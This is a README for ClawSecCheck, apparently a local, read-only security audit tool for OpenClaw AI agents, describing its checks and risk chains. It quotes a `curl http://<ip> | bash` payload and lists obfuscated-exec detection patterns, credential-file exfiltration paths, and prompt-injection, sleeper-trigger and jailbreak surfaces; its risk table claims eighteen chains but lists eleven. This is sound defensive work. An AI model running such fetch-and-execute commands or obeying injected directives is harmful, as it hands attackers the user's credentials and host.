<p align="center">
  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=32&duration=3000&pause=900&color=E34234&center=true&vCenter=true&width=660&lines=ClawSecCheck+%F0%9F%A6%9E;OpenClaw+Security+Self-Audit;Free.+Local.+Read-only.;Score+Your+Agent+A%E2%80%93F" alt="ClawSecCheck" />
</p>

<p align="center">
  <b>🦞 A free, local, read-only security self-audit for your own OpenClaw agent.</b><br>
  <sub><i>The claw that checks your claws — scores you A–F and reports the holes. Reports only — it never changes your OpenClaw setup.</i></sub>
</p>

<p align="center">
  <a href="https://github.com/gl0di/clawseccheck/releases"><img src="https://img.shields.io/github/v/tag/gl0di/clawseccheck?label=version&color=E34234&labelColor=2b2b2b" alt="version"></a>
  <a href="https://clawhub.ai/gl0di/clawseccheck"><img src="https://img.shields.io/badge/ClawHub-clawseccheck-FF6B47?labelColor=2b2b2b" alt="ClawHub"></a>
  <img src="https://img.shields.io/badge/python-3.9%2B-E8A33D?labelColor=2b2b2b" alt="Python 3.9+">
  <img src="https://img.shields.io/badge/dependencies-zero-C1272D?labelColor=2b2b2b" alt="Zero dependencies">
  <img src="https://img.shields.io/badge/network-none-8B0000?labelColor=2b2b2b" alt="No network">
  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-E34234?labelColor=2b2b2b" alt="License: MIT"></a>
  <a href="https://github.com/gl0di/clawseccheck/stargazers"><img src="https://img.shields.io/github/stars/gl0di/clawseccheck.svg?style=social" alt="GitHub stars"></a>
</p>

<p align="center">
  <b>🦞 Free&nbsp;·&nbsp;🔒 Local&nbsp;·&nbsp;👀 Read-only&nbsp;·&nbsp;🚫 No API key&nbsp;·&nbsp;🏠 Your data never leaves your machine</b>
</p>

---

A one-command security self-audit for *your own* OpenClaw agent. It scores your setup
**A–F** and surfaces the most urgent holes in plain language — reports only; it never fixes or changes your OpenClaw setup —
plus a **shareable grade badge**.

Because you run it on your own agent, there's no "scanning someone else" problem: no
proof-of-ownership, no legal grey area.

---

## 🔒 Local, read-only, and honest about its limits

ClawSecCheck runs **locally and read-only** — no network calls, no telemetry, nothing
leaves your machine. It's a heuristic audit, so it's upfront about what it does and
doesn't check:

**Honest limits (we never hide these behind a green score):**

- **Static analysis, not runtime-verified.** Findings describe your *configuration*, not a
  live exploit. Results are labelled accordingly.
- **`UNKNOWN` ≠ `PASS`.** If a file can't be read, the config can't be parsed, or a state
  can't be determined, it's reported as `UNKNOWN` and excluded from the score — never
  silently marked safe.
- **A broader config-level dirty-input action-gate is still on the roadmap;** the B13 taint trace
  (credential-file read → network sink) already ships. The shipped B33 version gate is seeded with
  a small set of grounded advisories — its table grows as new ones are verified, not an exhaustive
  CVE database yet.
- **Vetting the scanner itself** (`--vet` pointed at ClawSecCheck's own source) reports
  *safe with a note* — a security tool necessarily ships attack signatures as data.

**Found a false positive/negative or something confusing?** Open an issue at
<https://github.com/gl0di/clawseccheck/issues> with the output of `clawseccheck --json`
(it redacts secret *values* — only key names/paths appear) and your OpenClaw version. Do
not paste raw secrets.

---

## ⚠️ Important — trust no one (including this skill)

OpenClaw skills are **not sandboxed**: an installed skill runs with your agent's full
permissions. The ClawHavoc campaign poisoned ClawHub with **hundreds of malicious skills**
that steal credentials and crypto wallets — a single line of markdown can hide a
`curl http://<ip> | bash`.

So, before you download, install, or use **any** skill (this one included):

1. **Read the source** — it's plain text. If you can't see what it does, don't run it.
2. **Have your agent analyse it for you** — ask OpenClaw to review the skill's `SKILL.md`
   and scripts for shell-exec, credential access, paste-host uploads, and obfuscated
   (base64) payloads *before* enabling it. ClawSecCheck does this with `--vet <skill>`.
3. **Pin a known release**, prefer signed / VirusTotal-clean skills, and rotate any secret a
   skill could have reached if you ever suspect it.

ClawSecCheck practises this: it is open source, zero-dependency, read-only, and its **B13** check
does exactly this vetting on the skills you've *already* installed. Trust is earned by being
readable — so read it.

**Verifying ClawSecCheck itself hasn't been tampered with.** `clawseccheck --verify-self`
prints a SHA-256 digest of the engine's own source — but a digest computed *from inside* a
possibly-modified copy is only a tripwire, not proof (a tampered `integrity.py` could print
anything). The trusted reference lives out-of-band: every GitHub Release publishes a
`SHA256SUMS.txt` (same digest format `--verify-self` prints) signed with
[cosign](https://github.com/sigstore/cosign) in keyless mode via the release workflow's own
GitHub Actions OIDC identity — no private key for anyone to leak or steal. Verify it before
trusting the comparison:

```bash
# Get the release assets (adjust the version):
curl -LO https://github.com/gl0di/clawseccheck/releases/download/vX.Y.Z/SHA256SUMS.txt
curl -LO https://github.com/gl0di/clawseccheck/releases/download/vX.Y.Z/SHA256SUMS.txt.bundle

cosign verify-blob \
  --bundle SHA256SUMS.txt.bundle \
  --certificate-identity-regexp "^https://github.com/gl0di/clawseccheck/" \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  SHA256SUMS.txt
```

A passing `cosign verify-blob` proves `SHA256SUMS.txt` was produced by *this repo's* release
workflow and hasn't been altered since — not that the CI pipeline itself is uncompromisable.
This closes the loop against opportunistic tampering of a downloaded copy; it is not a
guarantee against a targeted adversary who also compromises the CI pipeline.

**The same principle applies to the host itself.** If a machine is already compromised,
anything running on it at your own privilege level — ClawSecCheck included — can in
principle be tampered with so it hides the compromise; `--verify-self` catches lazy
tampering, not a targeted adversary who patches the verifier too. The honest fix is to
scan the suspect config from a separate, clean machine via `--home`, not to trust a
self-check running on the box in question. See
[What if the host is already compromised?](docs/FAQ.md#what-if-the-host-is-already-compromised)
in the FAQ for the full protocol.

---

## 🤔 Why another audit tool?

The built-in `openclaw security audit` and tools like Trent/ClawSec are good — but:

- The native audit **does not inspect the content of your bootstrap files**
  (`SOUL.md`, `AGENTS.md`, `TOOLS.md`): they're injected into the system prompt as *trusted
  context* with no validation. ClawSecCheck **does** check them for prompt-injection-prone
  directives (our check **B6**).
- ClawSecCheck is **100% local** — no API key, nothing transmitted (Trent uploads your config;
  the native one is CLI-only).
- It leads with a **shareable Score + Grade + Lethal Trifecta ratio** you can post to the
  community — without ever exposing your actual findings.

---

## 🔬 What it checks

- **Lethal Trifecta** (untrusted input × sensitive data × outbound actions — keep ≤2 of 3)
- Gateway exposure & channel auth, plaintext secrets, least privilege, execution sandbox,
  plugin/skill supply-chain integrity, bootstrap-file injection surface, memory poisoning,
  human approval, secret-leak/redaction, TLS, local-first/model hygiene.
- **B13 — installed-skill / plugin vetting:** scans the *content* of skills you downloaded
  (not made yourself) for the ClawHavoc malware class, including base64-hidden payloads. As of
  v0.21 it also runs a static **Python AST** pass (stdlib `ast`, parse-only — never executed) that
  catches obfuscation regex misses — `exec(base64.b64decode(...))`, `getattr(os,"sys"+"tem")(...)`,
  `__import__("os").system(...)` — plus prompt-injection / hide-from-user directives embedded in a
  third-party skill's prose, and (v0.23) a **taint trace** that flags a credential **file's** contents
  (`~/.ssh/id_*`, `.aws/credentials`, keychain, wallet, …) flowing into a network sink ("read a secret
  file → send it out"). Sources are credential files only, not env vars, so the legit "read
  `OPENAI_API_KEY`, send as auth header" pattern is never flagged. (AST is Python-only; JS/shell stay
  on the regex engine.)
- Per-check reference: [`docs/CHECKS.md`](docs/CHECKS.md) for the generated catalog of checks,
  verdict semantics, remediation, and compound risk chains.
- **B14 — egress surface:** where the agent can reach out (channels, external skills, tools).
- **B15 — MCP server trust** boundaries.
- **B16 — threat monitoring:** whether you actually have monitoring/detection set up at all.
- **B17 — autonomy / heartbeat:** whether the agent acts on its own and could be steered by untrusted input.
- **B18 — subagent delegation:** whether spawned subagents can wield elevated/exec tools without approval.
- **B45 — per-agent privilege separation (attestation):** A1 flattens the whole setup into one
  capability surface; B45 reads the attested agent roster (`--attest`, `agents: [{name, tools}]`) and
  checks whether any *single* agent holds all three trifecta legs by itself. OpenClaw config has no
  per-agent tool allowlist, so this needs the self-report — `UNKNOWN` without it, advisory (`ATTESTED`,
  unscored). PASS means "no single agent is the full trifecta" — a necessary condition, **not** a
  guarantee: runtime data-flow and the delegation graph are out of scope.
- **B46 — multi-agent trifecta exposure:** config-only nudge — spawnable subagents **plus** the global
  trifecta **plus** no exec approval gate. Capped at WARN (never a new FAIL).
- **B47 — cross-agent trifecta reassembly (attestation):** even when no single agent is the trifecta,
  it can reassemble across delegation (a *confused deputy*): an untrusted-input agent that can drive a
  sensitive-data agent and an outbound agent. Reads the attested `delegation: [{from, to, returns}]`
  graph; the `returns` tier decides exploitability — a `schema` (typed) return is a **wall** that
  blocks the channel (PASS, with a not-runtime-verified caveat), while `raw`/`filtered`/`unknown`
  carries it (WARN). UNKNOWN without `--attest`. `RISK-11` narrates the chain. Runtime data-flow stays
  out of static scope.
- **B19 — data at-rest:** group/world-readable memory/log directories (conversation data / PII exposure).
- **B20–B24 — agent behavior:** write-protection of identity/memory files, tool-output trust boundary,
  self-modification risk, approval-bypass directives, and deep MCP-server hardening.
- **B30 — sender identity strength:** flags `channels.<provider>.dangerouslyAllowNameMatching`
  (allowlist keyed on mutable display name — trivially bypassed by renaming) and
  `channels.telegram.includeGroupHistoryContext="recent"` (untrusted group history injected as context).
- **B32 — control-plane mutation reachability:** flags control-plane tools (`cron`, `config.apply`,
  `update.run`, `sessions_spawn`, `sessions_send`, `gateway`) exposed via `gateway.tools.allow`
  over the HTTP gateway — full agent takeover without further escalation.
- **B38 — browser / SSRF exposure:** flags `browser.ssrfPolicy.dangerouslyAllowPrivateNetwork`
  (cloud-metadata IP access / credential theft via 169.254.169.254) and `browser.noSandbox`
  (headless browser without OS isolation); warns when no `hostnameAllowlist` limits egress.
- **B48 — dangerous break-glass overrides:** a grounded registry of OpenClaw's `dangerously*` /
  `allowUnsafe*` toggles that are documented "keep disabled." **FAIL** when a sandbox-escape
  (`sandbox.docker.dangerouslyAllow{ContainerNamespaceJoin,ExternalBindSources,ReservedContainerTargets}`)
  or control-plane auth-bypass (`gateway.controlUi.dangerouslyDisableDeviceAuth`) flag is active;
  **WARN** for the rest (webhook signature disable, host-header origin fallback, external embeds,
  real-IP fallback, `allowUnsafeExternalContent`, per-channel/plugin private-network access, extra
  node commands). Default/absent = clean PASS (zero false positives on a stock config).
- **B39 — session visibility / cross-user transcript leak:** flags `session.dmScope="main"`
  (all DM peers share one session — cross-user contamination) and `tools.sessions.visibility`
  of `"agent"` or `"all"` (cross-session transcript reads).
- **B26 — untrusted-context exposure:** flags `channels.<provider>.contextVisibility="all"` (the
  OpenClaw default), where quoted/thread/history text from non-allowlisted senders is injected into
  the model as context — a prompt-injection surface; recommends `allowlist`/`allowlist_quote`.
- **B33 — known-vulnerable version gate:** compares `meta.lastTouchedVersion` against a maintained
  OpenClaw advisory table (seeded with GHSA-g8p2-7wf7-98mq, fixed `2026.1.29`); unknown versions are
  `UNKNOWN`, never `PASS`.
- **B41 — credential blast-radius:** inventories the credential surface (`auth.profiles.*`,
  gateway token) reachable by the agent and warns when it co-exists with untrusted ingress + outbound
  tools. Reports only provider names + counts — never the account/email or token value.
- **B31 — effective-tools bypass:** detects the OpenClaw footgun where `tools.deny: ["write"]` does
  not deny `apply_patch`/`exec` — a believed-safe restriction that still allows file mutation; checks
  global, `toolsBySender`, and per-agent deny lists. Recommends `group:fs` or a complete deny list.
- **B42 — skill/plugin install-time policy:** install-time supply-chain risk that isn't malware
  per se — `package.json` `pre/postinstall` hooks that run code on install **and every auto-update**
  (unsandboxed, with the agent's permissions), and **world-writable skill directories** (any local
  user could drop a skill the agent loads). WARN-max, never FAIL; complements B25 (pinning) and B13
  (content).
- **B50–B54 — Host Watch Posture:** widens the lens past the agent to the *machine it runs on* —
  is anyone watching it? Read-only, filesystem-only detection (no subprocess, no network) of host
  defensive monitors: **B50** network monitoring / IDS (Suricata, Zeek, Snort, Little Snitch,
  Sysmon), **B51** host audit / syscall logging (auditd, OpenBSM, Sysmon), **B52** file-integrity
  monitoring (AIDE, Tripwire, osquery), **B53** endpoint protection / EDR (Wazuh, CrowdStrike,
  ClamAV, Defender, Santa), **B54** host firewall (ufw, firewalld, nftables, macOS ALF, Windows
  Firewall). LOW severity, **never FAIL**: a missing monitor is a WARN only when the agent is
  high-privilege, otherwise PASS; anything not determinable read-only is `UNKNOWN`. Where it can be
  read without running a command, it distinguishes *enabled* from merely *installed*.
- **B55 — filesystem-write tool exposure:** advisory warning when broad write-capability (`fs_write`,
  `apply_patch`) is granted without enough scoping controls.
- **B56 — dangerous Control-UI cross-origin policy:** flags `allowedOrigins: ["*"]` in control UI config.
- **B57 — plugin auto-approve:** flags `permissionMode: "approve-all"`, which bypasses explicit
  per-action confirmation in plugin execution.
- **B58 — Unicode-obfuscated injection / hidden-text evasion:** detects Unicode confusables, zero-width and
  bidi controls used to hide injection directives.
- **B59 — markdown-image / anchor data-exfil signals:** flags remote markdown image/anchor URLs with data-bearing
  query params that can leak context.
- **B60 — prompt self-replication / propagation directives:** catches prompt-level instructions that try
  to make injected content propagate itself.
- **B61 — cross-agent config snooping / credential theft:** flags cross-agent access to foreign agent
  identity/config paths combined with extraction capabilities.
- **B62 — capability–intent mismatch:** detects large drift between SKILL.md declared purpose and actual
  observed behavior from static and effect profiling.
- **B63–B66 — instruction hardening checks:** hidden directive / hierarchy override / sleeper trigger /
  persona-role jailbreak coverage.
- **C6 — hook-composition policy drop (legacy):** advisory `UNKNOWN` for pre-v2026.6.10 hook chains where
  policy drop order can behave unexpectedly.
- **B43 / B44 — capability blast-radius (attestation layer):** the static scan reads config files
  only; it cannot see the agent's *real tool/verb inventory* — config lists tool *names* as opaque
  strings. The attestation layer closes that: `--ask` emits a template the running agent fills with
  its own ground truth, and `--attest <file>` feeds it back. **B43** classifies the held verbs by
  blast radius — `EXEC` (bash/shell/exec — the broadest: subsumes egress+destruction),
  `MAILBOX_CONFIG` (auto-forward/filter/delegation — a persistent silent channel),
  `DESTRUCTIVE` (delete-forever/purge), `EGRESS` (send/forward/post), `REVERSIBLE`
  (search/get/draft/label). A reversible-only toolset *passes* (forward-exfil and delete-evidence
  are physically impossible); a high-blast verb that can fire without approval *fails*. **B44**
  cross-checks the self-report against the config `tools.allow` and flags a high-blast verb the
  config grants but the agent omitted (drift / blind spot / masking). Both at `ATTESTED` confidence —
  a self-report is weaker evidence than a config fact, so they are advisory and never override one.
  Read-only and introspective: the agent reports what it holds, it never *exercises* a verb to test it.
  The attestation `paths` block additionally lets the agent point B20/C5 at where its identity/memory
  files and OpenClaw install really live — discovery only: the agent supplies *where*, the engine still
  `stat()`s the path itself, so those permission findings keep full file-stat strength (not `ATTESTED`).
- **B20 / C5 — at-rest write protection:** B20 flags group/world-writable bootstrap/identity/memory
  files (`SOUL.md`/`AGENTS.md`/`TOOLS.md`/`MEMORY.md`) in the home root **and** the workspace dirs;
  C5 flags a group/world-writable openclaw binary dir, its install-tree ancestors (e.g. the npm
  package root — a binary-replacement vector), and writable PATH dirs before it. Sticky dirs like
  `/tmp` are exempt (the sticky bit blocks cross-owner replacement).
- **B80–B83 — DoS / exposure hardening (advisory):** **B80** flags token/password gateway auth on a
  non-loopback bind with no `gateway.auth.rateLimit` (brute-force surface); **B81** flags subagent
  spawn limits raised past the safe defaults (`maxSpawnDepth`/`maxChildrenPerAgent`/`maxConcurrent`)
  while an untrusted channel can reach the agent (fork-bomb / cost-exhaustion); **B82** flags a
  `logging.cacheTrace` transcript file persisted without `redactSensitive:"tools"` (secrets at rest);
  **B83** flags a high `tools.web.fetch.maxRedirects` ceiling (redirect-chain SSRF).
- **B85 — incident readiness (advisory, HIGH-confidence):** checks OpenClaw's per-session
  **trajectory sidecar** (`agents/<agent>/sessions/*.trajectory.jsonl`) — the on-disk,
  attributable record of tool calls — for *presence* (is tool use recorded at all?) and
  *tamper-resistance* (are the files or their `sessions/` dir group/world-writable, so the
  incident trail could be rewritten/deleted?). `stat()`-only — it never reads call contents.
  UNKNOWN when no sidecar exists (disabled/relocated/no runs yet), never a false FAIL.
- Plus your platform's own **`openclaw security audit`**, run for you and merged in.

**Mapped to OWASP.** Each check is tagged with its **OWASP Top 10 for LLM Applications (2025)**
category (surfaced per finding in `--json` as `"owasp": [...]`), and the checks are mapped to the
agent-specific **OWASP Agentic (ASI)** threat classes — tool misuse, multi-agent identity/privilege
abuse, insecure inter-agent communication, cascading blast-radius — that an app-code reviewer never
sees. Full matrix in [`docs/THREAT_COVERAGE.md`](docs/THREAT_COVERAGE.md).

---

## 🧩 Built-in audit, included for you

Non-technical users will never open a terminal to run OpenClaw's own
`openclaw security audit`. So ClawSecCheck runs it **for you** (read-only) and folds its
findings into the same plain-language report — one button shows both ClawSecCheck's checks
*and* the platform's own audit. Native findings are shown but are **not** mixed into the
ClawSecCheck score (kept deterministic). Disable with `--no-native`.

---

## 🛡️ Trust / provenance

ClawSecCheck is **open source and zero-dependency (Python stdlib only)**. Its own checks are
**read-only and offline** — they make **no network calls** and never touch your OpenClaw config.
**Nothing ever leaves your machine.** Full read scope:

- `~/.openclaw/openclaw.json` and workspace bootstrap files (`SOUL.md`, `AGENTS.md`, etc.)
- text of installed skills/plugins (Python files are AST-parsed, never executed)
- `~/.openclaw/logs/config-audit.jsonl` and `config-health.json` (B77/B78 log checks)
- `~/.openclaw/agents/.../sessions/*.jsonl` (B79 approval-policy posture)
- host OS path-existence checks for IDS/FIM/EDR/firewall config (B50–B54)
- credential-store path-existence inventory: whether `.env`, SSH key dirs, keychain/keyring
  directories, and browser cookie stores **exist** near the agent home — contents never read.

The only thing it writes by default is a one-line
entry to a **private, owner-only** local score history (`~/.clawseccheck/history.jsonl`) so you can
track your grade over time — opt out with `--no-history`. Everything else is written only when you
ask: a report file (`--save`), the `--monitor` snapshot and change journal
(`~/.clawseccheck/state.json`, `events.jsonl`), a badge (`--badge`), HTML/SARIF (`--html`/`--sarif`),
a log (`--log`), and a small freshness ledger (`~/.clawseccheck/coverage.json`) recording when you
last ran an active self-test (`--canary`/`--redteam`/`--dryrun`/`--self-test`/`--vet-mcp`).

The **only** external command it can run is your own, fixed and read-only:

```text
openclaw security audit --json
```

No shell, read-only mode only, with a timeout; skip it entirely with `--no-native`. The entire
source is in [`clawseccheck/`](clawseccheck/) — read it before you trust it. Amid the ClawHavoc
malicious-skill wave, an audit skill should prove its own safety; this one does.

---

## 🚀 Install & run

```bash
openclaw skills install clawseccheck            # from ClawHub (the slug is unique)
openclaw skills install git:gl0di/clawseccheck  # or straight from GitHub
# then ask your agent: "audit my OpenClaw setup with clawseccheck"
```

Skill page on ClawHub: **<https://clawhub.ai/gl0di/clawseccheck>**.

Or install it as a standalone CLI (zero dependencies):

```bash
pipx install git+https://github.com/gl0di/clawseccheck   # or: pip install .
clawseccheck --home ~/.openclaw                            # then just `clawseccheck`
python -m clawseccheck                                     # also works
```

Or run the bundled script directly (Linux/macOS):

```bash
python3 audit.py                 # human report + shareable card
python3 audit.py --menu          # the Welcome menu (four common modes)
python3 audit.py --functions     # the full capability palette (everything it can do)
python3 audit.py --json          # machine-readable
python3 audit.py --card          # just the badge
python3 audit.py --ascii         # plain output (no unicode icons/box)
python3 audit.py --no-color      # disable ANSI colour (see below)
python3 audit.py --home ~/.openclaw
```

The terminal report is colourised (grade, score-bar, severity icons) **only** when output is
an interactive terminal. Colour is switched off automatically when the output is piped or
redirected, by `--no-color`, or by the [`NO_COLOR`](https://no-color.org) environment variable;
`FORCE_COLOR` forces it on. Saved reports (`--save`) are always written as plain text.

On **Windows** use `python` (or `py`); the script auto-detects consoles that can't render
unicode and falls back to ASCII, or force it with `--ascii`:

```bat
python audit.py
py audit.py --card --ascii
```

Cross-platform: pure Python stdlib, pathlib-based paths, and an ASCII fallback for every
output. The read-only audit runs on Linux, macOS, and Windows (Linux + macOS are covered by
CI). **Local-store hardening is POSIX-only, though:** the "owner-only, symlink-safe"
guarantees for `~/.clawseccheck/` (history/state/reports) rely on POSIX `chmod` and
`O_NOFOLLOW`. On **Windows** both degrade — file modes are not enforced as NTFS ACLs (the
store is not owner-restricted) and the symlink-clobber guard is a no-op — so on Windows treat
`~/.clawseccheck/` as an ordinary user file, not a hardened store. The audit results
themselves are unaffected.

---

## 🦞 The OpenClaw ecosystem

ClawSecCheck is one skill in a fast-growing OpenClaw ecosystem — and that growth is exactly
why a local, read-only vetting tool exists. Browse more, but **vet before you trust**:

| | Resource | What it is |
|---|---|---|
| 🦞 | **[ClawHub — clawseccheck](https://clawhub.ai/gl0di/clawseccheck)** | This skill's page — install, current version, changelog |
| 📚 | [awesome-openclaw-skills](https://github.com/VoltAgent/awesome-openclaw-skills) | 5,300+ community skills, organized by category |
| 🤖 | [awesome-openclaw-agents](https://github.com/mergisi/awesome-openclaw-agents) | Agent templates, real-world use cases & integrations |
| 🛡️ | [OpenClaw gateway security docs](https://docs.openclaw.ai/gateway/security) | The platform's own hardening guide |

> 🦞 **Before installing anything from these lists** (this skill included): read the source,
> vet it — `clawseccheck --vet <path>` — and pin a known release. The ClawHavoc wave proved
> that *"popular on a list"* is not the same as *"safe to run."*

---

## 🔄 Updating

OpenClaw remembers where a skill came from, so users get your new versions by updating:

```bash
openclaw skills update clawseccheck   # pull the latest from its source (Git/ClawHub)
clawhub update --all                  # update every installed skill
```

(Or re-run the install command.) An auto-updater skill / `update.auto.enabled` in
`~/.openclaw/openclaw.json` can update on a schedule. Because skills run with the agent's full
permissions, a malicious *update* is a real supply-chain risk — so each release here is tagged
and the source is public to read **before** updating. Prefer reviewing/pinning a tag over blind
auto-update for anything security-sensitive.

> **First call after an update looks empty?** Some OpenClaw versions reload a freshly-updated
> skill lazily, so the *first* invocation right after an update can return nothing; just run it
> again. This is an OpenClaw skill-reload timing artifact on the runtime side, not the audit —
> confirm the engine is live with `clawseccheck --verify-self`.

**Staleness reminder (offline).** A stale security scanner is itself a risk, so the default report
may print a one-line "your build may be out of date" notice. It is **100% offline** — it reads only
the local clock against the baked-in build date, plus an optional local hint file
`~/.clawseccheck/latest.json` that your distribution layer or agent may write. ClawSecCheck **never
checks for its own updates over the network** (that would break its zero-network promise and it
would have to flag itself). The actual "is there a newer version?" lookup belongs to your package
tooling or your agent — see SKILL.md "Keeping ClawSecCheck current". Silence the notice with
`--no-update-notice` or `CLAWSECCHECK_NO_UPDATE_NOTICE=1`; after any update, verify the engine with
`--verify-self`.

---

## 🧭 Guided mode

When you run ClawSecCheck inside OpenClaw, the agent walks you through the entire audit
conversationally — you never need to know a flag. After every default run, ClawSecCheck prints a
short **"What you can do next"** block: a prioritised list of the most relevant follow-up steps
for *your* findings, with the exact command to run each one.

The same list is available two other ways:

```bash
python3 audit.py --next          # print the next-steps block only (after running the audit)
python3 audit.py --json          # includes a "next_actions" array in the JSON envelope
```

The recommendations are driven by your actual results — unvetted third-party skills surface
`--vet`; no monitoring detected surfaces `--monitor`; trifecta exposure surfaces the live
injection tests; and so on. Every suggestion is a further **check** — never remediation.

**ClawSecCheck is reports-only: it never fixes, suggests fixes, or changes your config.**
The human report states what is wrong and why; acting on it is yours. For machine consumers,
each finding still carries structured `"fix"`/`"remediation"` data in `--json` and SARIF —
data for your own tooling, not something ClawSecCheck renders or offers.

---

## 🍳 Recipes / common prompts

Most people never type a flag — you talk to your agent, it has the skill installed, and it runs
the right command for you. Here are ready-to-say prompts for common goals: what to tell your
agent, what happens, and (for the CLI-minded) the underlying command. Every recipe below is
audit/report only — nothing here ever changes your config.

(This is the human-facing cookbook. For the full agent-facing phrase-to-flag routing table the
skill itself uses, see [`SKILL.md`](SKILL.md#natural-language-to-tool-quick-map).)

| You say | What happens | Under the hood |
|---|---|---|
| "Audit my setup, what's my grade?" | Runs the full audit, shows Score + Grade (A–F) and findings grouped by area, most urgent first. | `clawseccheck` (no flags) |
| "Is this skill safe to install?" / "Vet this before I install it" | Scans the skill's content for malware patterns, injection directives, and supply-chain risk *before* you enable it — type is autodetected. | `--vet <path>` (or `--vet-skill <path>` / `--vet-plugin <path>` to force an engine) |
| "Is this safe to even download?" | Checks the *source*'s identity (typosquat, known-bad, unpinned ref) with zero network before anything is fetched. | `--vet-source <slug\|url\|pkg>` |
| "Are my MCP servers trustworthy?" | Vets every connected MCP server for supply-chain risk (unpinned installs, plaintext transports, broad OAuth scopes). | `--vet-mcp` |
| "What's the single most important thing to fix?" | Prints a prioritised "what you can do next" list based on your actual findings — still just further checks, never auto-fixes. | `--next` |
| "Give me copy-paste fixes" | The default report already states, per finding, what's wrong and a fix suggestion in plain language; `--json`/SARIF carry the same as structured `fix` data for tooling. ClawSecCheck never applies a fix itself. | `clawseccheck` (read the report) / `--json` |
| "Am I vulnerable to prompt injection?" | Runs live self-tests: a benign injection canary, a broader dry-run harness, or both plus red-team payloads together. | `--canary` · `--dryrun` · `--self-test` |
| "What dangerous actions can my agent actually take?" | Emits a self-report template for your agent to fill in with its real tool/verb inventory, then scores the blast radius (EXEC, DESTRUCTIVE, EGRESS, …) once you feed it back. | `--ask` then `--attest <file>` |
| "Watch for changes over time" | Re-audits and alerts on what changed since last time (new skill, config drift, a check flipping PASS→FAIL). **Note:** this is the one opt-in exception to read-only — it writes a small local snapshot (`~/.clawseccheck/state.json`) so it has something to diff against next run. | `--monitor` |
| "Am I improving? How do I rank?" | Shows your score history over time, or how your current score compares to an offline reference profile — no network either way. | `--trend` · `--percentile` |
| "Share my grade without leaking my findings" | Produces just the grade + score (+ Lethal Trifecta ratio) — safe to post; your actual findings never appear. | `--card` (prints it) · `--badge grade.svg` (writes an SVG) |
| "What's actually installed — skills, MCP servers, versions?" | Exports a local bill-of-materials (skills, MCP servers, hashes, declared/unpinned dependencies) as JSON. | `--sbom` |
| "I think I've been compromised — help me preserve evidence" | Bundles a findings snapshot, skill/MCP hashes, trajectory-log hashes, and a credential rotation list into one local JSON file — a preservation aid, never rotates or deletes anything itself. | `--incident` |
| "Did a suspicious skill's instruction actually run?" | Post-hoc correlation: checks whether the credential/exfil/secret-path indicators an installed skill names show up in real `tool.call` arguments in your OpenClaw trajectory sidecars — "acted on" vs "present but not acted on". Reads args in memory only; never echoes them. | `--analyze-trajectory` |
| "What did my agent actually DO, not just what it could do?" | Reconstructs observed tool-call sequences from your OpenClaw trajectory sidecars and flags a proven-by-log ingress→sensitive→egress verb order, or a repeated-failure-then-success pattern on a sensitive-data call. Metadata-only — verb identity and sequencing, never call/return payloads. WARN-only, never scored. | `--behavioral` |
| "Gate my CI on this" | Machine-readable output plus a non-zero exit when the score drops below a bar or an unsuppressed FAIL exists — wire straight into a pipeline. | `--json` · `--sarif results.sarif` · `--fail-under 70` · `--exit-code` |

---

## 📋 How you get the report

When you run the skill inside OpenClaw, the agent executes `audit.py`, captures its output,
and shows it to you **right there in the chat** — no terminal, no setup. You see:

1. your **Score / Grade**,
2. **findings grouped by area** (network, privilege, supply chain, secrets, …), most urgent
   first within each — the Lethal Trifecta shows up here too, as a Privilege & Execution
   finding, not a separate headline, and
3. a **shareable card** — grade + score + Lethal Trifecta ratio, safe to post (the findings stay
   private; `--badge` writes the same grade + score as an SVG).

To keep a copy, add `--save report.txt` and ClawSecCheck writes the full report to that file
(written only when you ask). For automation, `--json` gives a machine-readable result.

Chat rendering is best-effort — the host agent relays and re-composes that text over its own
channel. The **canonical, deterministic output is always a saved file**: `--save`, `--html`,
or `--badge grade.svg`. If you need something you can rely on byte-for-byte (or attach as a
real image, in the badge's case), use the saved file, not the chat paste.

---

## 📡 Threat monitoring

Two complementary things:

**B16 — do you have monitoring at all?** ClawSecCheck checks whether you have threat
monitoring/detection set up — an agent with none won't alert you if it's compromised. B16 looks
for a monitoring skill/plugin (ClawSec, `openclaw-security-monitor`, …) or monitoring/alerts
config; if none is found it warns you and tells you how to add one.

**`--monitor` — Agent Watch.** One way to *get* monitoring: re-audit on a schedule and alert,
**by severity**, on what **changed** — a new or modified installed skill, `SOUL.md` drift, a dropped
score, a check going PASS → FAIL, **a newly connected MCP server, a new channel, the gateway becoming
network-exposed, or a host monitor disappearing**. Each run appends the changes to a private local
journal (`~/.clawseccheck/events.jsonl`, owner-only, never uploaded); view the timeline with
`--watch-log`. (Drift detection is upgrade-safe: an older snapshot never produces spurious
"new connection" alerts.)

```bash
python3 audit.py --monitor                 # first run = baseline, then alerts on changes
python3 audit.py --monitor --state ~/.clawseccheck/state.json
```

Schedule it via OpenClaw's heartbeat or cron; when an alert fires, have your agent message you.
It stores one small snapshot at `~/.clawseccheck/state.json`. (Scheduled re-audit + drift
detection — not a real-time runtime IDS; that heavier model is intentionally out of scope.)

---

## ⛓️ Highest-risk paths

Beyond individual checks, ClawSecCheck runs a **risk engine** that looks for dangerous
*combinations* — capability chains where two or more co-occurring properties make a
compromise catastrophic or trivial to execute.

The highest-risk chains it detects now span **RISK-01 through RISK-18**:

| ID | Severity | Chain |
|----|----------|-------|
| RISK-01 | CRITICAL | Untrusted sender (open DM/group) → exec/write/elevated tool → host/filesystem |
| RISK-02 | HIGH | Untrusted input → sensitive data reachable → outbound/exec (Lethal Trifecta) |
| RISK-03 | HIGH | Untrusted ingress + no execution sandbox → exec/write directly on host |
| RISK-04 | HIGH | Mutable agent identity (name-matching) → elevated/exec tools → privilege escalation |
| RISK-05 | HIGH | Browser SSRF to private network → secrets/credentials → exfiltration |
| RISK-06 | CRITICAL | Open/untrusted surface → control-plane endpoint → full agent takeover |
| RISK-07 | HIGH | Exec/write tool (no approval gate) → writable bootstrap/identity files → persistent compromise |
| RISK-08 | MEDIUM | Multi-user channel → shared session (`dmScope="main"`) → cross-user data leak |
| RISK-09 | CRITICAL | Malicious installed skill (B13 fail) → reachable secrets/data → outbound egress → exfiltration |
| RISK-10 | MEDIUM | Untrusted input → agent can exec/write on host → no host detection (IDS/audit/FIM/EDR) → a breach would be invisible |
| RISK-11 | HIGH | Cross-agent trifecta reassembly (confused deputy): untrusted-input agent → drives a sensitive-data agent → drives an outbound agent across non-wall delegation edges |
